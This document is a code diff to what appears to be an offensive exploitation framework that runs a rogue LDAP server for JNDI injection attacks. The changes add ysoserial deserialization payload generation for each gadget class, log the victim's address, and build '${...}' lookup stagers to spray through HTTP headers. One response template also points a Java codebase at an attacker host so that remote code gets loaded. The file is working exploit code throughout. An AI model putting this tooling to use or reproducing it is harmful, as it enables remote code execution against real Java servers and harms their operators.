@@ -15,7 +15,7 @@ from horrors import (
     scenarios,
     services,
 )
-
+from payloads.generic.ysoserial import YsoserialPayload
 
 try:
     import attacker_config as config
@@ -40,7 +40,7 @@ class LDAP(services.Service):
     RESPONSE_LDAP_SERIALIZED = {
         'javaClassName': 'Payload',
         'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
-        'javaSerializedData': '\xac\xed\x00\x05\x73\x72\x00\x06\x43\x75\x73\x74\x6f\x6d\x2e\x2e\x6e\xdf\xa1\x51\x24\x51\x02\x00\x00\x78\x70',
+        'javaSerializedData': '',
     }
     RESPONSE_LDAP_REFERENCE = {
         'javaClassName': 'Payload',
@@ -66,11 +66,17 @@ class LDAP(services.Service):
     def deserialize(self, raw):
         return ber_decode(raw, asn1Spec=LDAPMessage())[0]
 
-    def serialize(self, query_name):
-        try:
-            template = self.RESPONSE_LDAP[query_name]
-        except KeyError:
-            # NOTE: Fallback to `RESPONSE_LDAP_REFERENCE` by default if unknown query path
+    def serialize(self, query_name, context):
+        query_name_tmp = query_name.split('/')
+        template_type = query_name_tmp[0]
+        template = self.RESPONSE_LDAP.get(template_type)
+        if template == self.RESPONSE_LDAP_SERIALIZED:
+            template = self.RESPONSE_LDAP_SERIALIZED.copy()
+            cls = query_name_tmp[1]
+            payload = YsoserialPayload(config)
+            context['CLASS'] = cls
+            template['javaSerializedData'] = payload.generate(context)
+        if not template or 'cls' not in locals():
             template = self.RESPONSE_LDAP_REFERENCE
         return self.search_res_entry(query_name, template)
 
@@ -117,11 +123,13 @@ class LDAP(services.Service):
         writer.write(self.bind_response())
         query = await reader.read(8096)  # Note: SearchRequest
         try:
-            query_name = self.deserialize(query)['protocolOp']['searchRequest']['baseObject']
+            query_name = str(self.deserialize(query)['protocolOp']['searchRequest']['baseObject'])
         except PyAsn1Error:
             query_name = 'reference'
         logging.debug('Responding to query: ' + query_name)
-        response = self.serialize(query_name)
+        context = self.scenario.context.copy()
+        context['VICTIM_HOST'] = socket.getpeername()[0]
+        response = self.serialize(query_name, context)
         await writer.drain()
         writer.write(response)
         writer.write(self.search_res_done())
@@ -149,9 +157,15 @@ class SendRequests(scenarios.Scene):
         for ldap_type in LDAP.RESPONSE_LDAP.keys():
             for port in config.LDAP_PORTS:
                 for bypass in config.BYPASSES:
-                    stagers.append(
-                        Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
-                    )
+                    if ldap_type == 'serialized':
+                        for cls in YsoserialPayload.PAYLOAD_CLASSES:
+                            stagers.append(
+                                Template('${' + bypass + '/' + ldap_type + '/' + cls + '}').substitute(LDAP_PORT=port, **self.context)
+                            )
+                    else:
+                        stagers.append(
+                            Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
+                        )
         for stager in stagers:
             logging.debug('Using stager: ' + stager)
             for header in config.HTTP_HEADERS:
